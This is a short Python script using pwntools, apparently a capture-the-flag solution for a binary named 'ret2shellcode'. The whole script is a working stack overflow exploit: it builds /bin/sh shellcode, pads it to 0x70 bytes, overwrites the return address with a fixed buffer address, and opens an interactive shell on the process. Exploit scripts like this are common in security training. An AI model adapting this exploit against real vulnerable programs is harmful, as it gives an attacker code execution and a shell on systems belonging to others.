from pwn import *

sh = process("./ret2shellcode")
shellcode = asm(shellcraft.sh())
buf2_addr = 0x0804a080
payload = flat([shellcode.ljust(0x70, "A".encode()), buf2_addr])
sh.sendline(payload)
sh.interactive()
